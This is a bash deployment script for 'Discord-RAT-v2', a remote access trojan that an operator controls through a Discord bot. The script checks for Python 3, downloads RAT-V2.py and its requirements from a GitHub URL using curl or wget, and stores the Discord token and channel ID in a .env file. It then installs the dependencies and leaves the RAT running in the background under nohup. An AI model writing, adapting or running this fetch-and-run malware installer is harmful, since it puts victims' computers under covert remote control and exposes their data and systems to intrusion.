#!/bin/bash

# Deploy-script-bash.sh
# Deployment script for Discord-RAT-v2 on Linux and macOS
# Usage: bash Deploy-script-bash.sh <discord-token> <channel-id>

set -e

DISCORD_TOKEN="$1"
CHANNEL="$2"

RAT_URL="https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/RAT-V2.py"
REQUIREMENTS_URL="https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/requirements.txt"

if [ -z "$DISCORD_TOKEN" ]; then
    echo "Error: Discord token is required."
    echo "Usage: bash Deploy-script-bash.sh <discord-token> <channel-id>"
    exit 1
fi

if [ -z "$CHANNEL" ]; then
    echo "Error: Channel ID is required."
    echo "Usage: bash Deploy-script-bash.sh <discord-token> <channel-id>"
    exit 1
fi

# Detect the operating system
OS="$(uname -s)"
case "$OS" in
    Linux*)  PLATFORM="Linux" ;;
    Darwin*) PLATFORM="macOS" ;;
    *)
        echo "Error: Unsupported operating system: $OS"
        exit 1
        ;;
esac

# Resolve the Python 3 interpreter
if command -v python3 &>/dev/null; then
    PYTHON="python3"
elif command -v python &>/dev/null && python --version 2>&1 | grep -q "^Python 3"; then
    PYTHON="python"
else
    echo "Error: Python 3 is not installed. Please install Python 3 and try again."
    exit 1
fi

# Resolve pip for the chosen interpreter
if "$PYTHON" -m pip --version &>/dev/null; then
    PIP="$PYTHON -m pip"
else
    echo "Error: pip is not available for $PYTHON. Please install pip and try again."
    exit 1
fi

# Download RAT-V2.py if not already present
if [ ! -f "RAT-V2.py" ]; then
    echo "Downloading RAT-V2.py..."
    if command -v curl &>/dev/null; then
        curl -fsSL "$RAT_URL" -o RAT-V2.py
    elif command -v wget &>/dev/null; then
        wget -q "$RAT_URL" -O RAT-V2.py
    else
        echo "Error: Neither curl nor wget is available. Please install one of them and try again."
        exit 1
    fi
fi

# Write the .env file with restrictive permissions
(umask 177 && cat > .env <<EOF
DISCORD_TOKEN=$DISCORD_TOKEN
CHANNEL=$CHANNEL
EOF
)

# Download and install dependencies
echo "Installing dependencies..."
REQUIREMENTS_TMP="$(mktemp)"
if command -v curl &>/dev/null; then
    curl -fsSL "$REQUIREMENTS_URL" -o "$REQUIREMENTS_TMP"
elif command -v wget &>/dev/null; then
    wget -q "$REQUIREMENTS_URL" -O "$REQUIREMENTS_TMP"
fi
$PIP install -r "$REQUIREMENTS_TMP" --quiet
rm -f "$REQUIREMENTS_TMP"

# Run the RAT in the background, with output redirected to a log file
echo "Starting RAT-V2.py..."
(umask 177 && touch rat.log)
nohup "$PYTHON" RAT-V2.py >> rat.log 2>&1 &
RAT_PID=$!

echo "RAT-V2 is running in the background (PID $RAT_PID). Output is logged to rat.log"
